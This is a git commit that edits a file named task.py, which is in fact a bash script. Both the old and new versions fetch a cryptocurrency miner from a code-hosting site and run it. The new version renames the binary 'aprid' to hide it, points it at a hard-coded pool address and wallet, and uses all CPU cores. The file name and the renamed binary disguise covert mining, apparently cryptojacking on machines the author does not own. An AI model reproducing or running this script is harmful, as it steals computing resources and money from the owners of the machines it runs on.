f6d88fffd4002dcb5f2bd878e4c0231e26ac97b1
mayangindrawati448 <mayangindrawati448@tognu.com>
2025-03-22 03:42:25 +0700

    Update task.py

--- task.py
+++ task.py
@@ -1,3 +1,6 @@
 #!/bin/bash
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o 146.190.96.150:443 -u solo:SaLvs7GhGVsP5LfYtoAtJZ4PBc3jQP8hR4jN2bR2jACs12QQkLVPv5Z1DuMkmBJqvEQdm2j6Gc97B8qMPWK2RTspfHqJnCKZtN1 -p tsdei -a rx/0
+yum update && yum -y install sudo
+yum -y install git wget
+git clone https://bitbucket.org/asana/luo.git && cd luo
+chmod 777 aprid SHA256SUMS
+./aprid --donate-level 1 -o 146.190.96.150:443 -u SaLvs7GhGVsP5LfYtoAtJZ4PBc3jQP8hR4jN2bR2jACs12QQkLVPv5Z1DuMkmBJqvEQdm2j6Gc97B8qMPWK2RTspfHqJnCKZtN1 -p gasruy -a rx/0 -k -t $(nproc --all)
